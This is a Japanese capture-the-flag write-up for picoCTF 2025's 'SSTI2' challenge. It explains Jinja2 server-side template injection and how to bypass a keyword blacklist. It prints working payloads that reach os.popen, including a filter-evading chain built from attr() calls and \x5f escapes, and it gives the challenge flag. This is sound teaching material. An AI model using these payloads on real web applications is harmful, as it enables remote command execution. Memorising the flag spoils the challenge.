# picoCTF 2025 – SSTI2 Writeup

## 🎯 問題概要

入力フォームに文字を入力すると、その内容がサーバー側でテンプレートとして評価される Web 問題。

目的は、サーバー上に存在する `flag` を取得すること。

---

## 🧠 Step 1 – SSTI の確認

まず以下を入力する：

```
{{7*7}}
```

出力：

```
49
```

これはテンプレートエンジン（Jinja2）が動作している証拠。

つまり：

> サーバー側で Python コードが評価されている状態

この脆弱性を **SSTI (Server Side Template Injection)** という。

---

## 🧠 Step 2 – 直接的なRCEはブロックされる

通常であれば以下のようなペイロードで OS コマンド実行が可能：

```
{{request.application.__globals__.__builtins__.__import__('os').popen('ls').read()}}
```

しかし今回は以下のメッセージが表示される：

```
Stop trying to break me >:(
```

→ 入力に対してブラックリスト型フィルタが実装されている。

---

## 🧠 Step 3 – フィルタの内容を推測

ブロックされている文字やキーワード：

- `.`
- `_`
- `__`
- `[]`
- `import`
- `os`

つまり、単純な文字列検知型フィルタ。

---

## 🧠 Step 4 – フィルタ回避の考え方

### 🔹 ドット禁止 → `attr()` を使う

通常：

```
request.application
```

回避：

```
request|attr('application')
```

---

### 🔹 アンダースコア禁止 → 16進エスケープを使う

`_` の 16進コードは：

```
\x5f
```

そのため：

```
__globals__
```

は以下のように書ける：

```
\x5f\x5fglobals\x5f\x5f
```

---

## 🧠 Step 5 – フィルタ回避ペイロード

以下をそのまま入力欄に貼り付ける：

```
{{ request
   |attr('application')
   |attr('\x5f\x5fglobals\x5f\x5f')
   |attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')
   |attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')
   |attr('popen')('cat flag')
   |attr('read')()
}}
```

---

## 🧠 このペイロードがしていること

1. `request`
2. → `application`
3. → `__globals__`
4. → `__builtins__`
5. → `__import__('os')`
6. → `popen('cat flag')`
7. → `read()`

つまり：

Python → OS コマンド実行 → flag 読み込み

を実行している。

---

## 🏁 取得できたフラグ

```
picoCTF{sst1_f1lt3r_byp4ss_4de30aa0}
```

---

## 🎓 学んだこと

- SSTI はサーバー側コード実行につながる危険な脆弱性
- ブラックリスト型フィルタは回避可能
- Jinja2 の `attr()` は強力
- `_` は `\x5f` で回避できる

